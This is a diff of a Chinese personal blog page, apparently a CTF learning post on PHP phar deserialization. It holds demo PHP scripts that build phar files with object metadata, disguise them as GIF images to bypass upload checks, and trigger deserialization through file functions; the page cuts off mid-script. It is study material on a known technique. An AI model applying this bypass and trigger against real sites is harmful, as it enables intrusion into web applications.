@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Phar反序列化, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="0x01 前言
+这里依旧是打比赛的时候，遇到了多次phar反序列化知识，虽然此前了解过，但感觉学的不够深刻，借此来增进一下记忆，顺便看看能进阶到哪里。
+本文质量不高，我纯垃圾，只为让自己学懂，见谅！
+0x02 原理分析
+看到一位师傅说pha">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +17,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>Phar反序列化 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +70,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +160,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +181,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +358,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +399,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-12-22
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    13 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -496,64 +452,134 @@
 <p>简单理解 phar:// 就是一个类似 file:// 的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。</p>
 <p>下面看一下phar文件的结构：大体来说 Phar 结构由4部分组成</p>
 <p><strong>1.stub ：phar文件标识</strong></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title class_">Phar</span>::<span class="hljs-title function_ invoke__">mapPhar</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-string">'phar://phar.phar/index.php'</span>;<br><span class="hljs-title function_ invoke__">__HALT_COMPILER</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token function">mapPhar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token string single-quoted-string">'phar://phar.phar/index.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 函数识别利用。</p>
 <p><strong>2. a manifest describing the contents</strong><br>
 phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p><img src="image-20231113204139373.png" alt="image-20231113204139373"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113204139373.png" alt="image-20231113204139373"></p>
 <p><strong>3. the file contents</strong><br>
 被压缩文件的内容。</p>
 <p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>
 签名，放在文件末尾，格式如下：</p>
-<p><img src="image-20231113204257222.png" alt="image-20231113204257222"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113204257222.png" alt="image-20231113204257222"></p>
 <h2 id="2-2-demo测试">2.2 demo测试</h2>
 <p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p>
 <p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p>
 <p>但看了其他的文章说，同时要保证PHP版本&gt;5.3.0</p>
 <p><code>phar_gen.php</code></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>    }<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
+    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
+    <span class="token comment">//签名自动计算</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里对test.txt那一行代码产生了疑惑：为何要存在这一行代码？问了GPT，回答如下：</p>
 <p>这行代码是为了在 PHAR 文件中包含一个示例文件，以便在需要时可以从 PHAR 归档中提取和使用这个文件。</p>
 <p>emmm暂时还是理解不，先继续往下学吧</p>
-<p><img src="image-20231113205224550.png" alt="image-20231113205224550"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113205224550.png" alt="image-20231113205224550"></p>
 <p>可以明显的看到meta-data是以序列化的形式存储的：</p>
 <p>有序列化数据必然会有反序列化操作，php一大部分的<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
-<p><img src="image-20231113205312788.png" alt="image-20231113205312788"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113205312788.png" alt="image-20231113205312788"></p>
 <p>这里看着佬看起了底层代码实现逻辑，但目前的我肯定看不懂，因此这里我抱着看懂大概，跟着看着学的心态了。</p>
 <p>来看一下php底层代码是如何处理的：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php-src/ext/phar/phar.c<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113210012327.png" alt="image-20231113210012327"></p>
+<pre class="line-numbers language-none"><code class="language-none">php-src/ext/phar/phar.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210012327.png" alt="image-20231113210012327"></p>
 <p>看不懂，但能猜到上述箭头处是对我们phar文件中的metadata数据进行反序列化操作。</p>
 <p>这里借用佬的例子证明了（不想费时间写了。。。</p>
 <p>phar_test1.php</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'Destruct called'</span>;<br>        }<br>    }<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">'phar://phar.phar/test.txt'</span>;<br>    <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113210118189.png" alt="image-20231113210118189"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/test.txt'</span><span class="token punctuation">;</span>
+    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210118189.png" alt="image-20231113210118189"></p>
 <p>其他函数当然也是可行的：</p>
 <p>phar_test2.php</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'Destruct called'</span>;<br>        }<br>    }<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">'phar://phar.phar/a_random_string'</span>;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-comment">//......</span><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>
+    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//......</span>
+ <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗</p>
 <p>藏杀机”，极大的拓展了攻击面。</p>
 <h2 id="2-3-将phar伪造成其他格式的文件">2.3 将phar伪造成其他格式的文件</h2>
 <p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>    }<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"GIF89a"</span>.<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span>-&gt;data=<span class="hljs-string">'hello hybcx!'</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113210347172.png" alt="image-20231113210347172"></p>
-<p><img src="image-20231113210715458.png" alt="image-20231113210715458"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
+    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token operator">=</span><span class="token string single-quoted-string">'hello hybcx!'</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
+    <span class="token comment">//签名自动计算</span>
+    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210347172.png" alt="image-20231113210347172"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210715458.png" alt="image-20231113210715458"></p>
 <p>那么我们看看这个假装自己是图片的phar文件最后的效果。</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">'phar://phar.jpg'</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>        }<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113210806276.png" alt="image-20231113210806276"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210806276.png" alt="image-20231113210806276"></p>
 <p>成功反序列化识别文件内容，采用这种方法可以绕过很大一部分上传检测。</p>
 <h2 id="2-4-触发反序列化的文件操作函数">2.4 触发反序列化的文件操作函数</h2>
 <p>我们继续跟着那位师傅再次分析一波文件操作函数</p>
 <p>受影响函数如下：</p>
-<p><img src="image-20231113210934251.png" alt="image-20231113210934251"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113210934251.png" alt="image-20231113210934251"></p>
 <p>为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？这里需要通过php底层代码才能知道，关于这个问题ZSX师傅的</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958#toc-0">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>已经详细分析了。这里通过一个demo论证一下上述结论。仍然以上面的phar文件为例</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Destruct 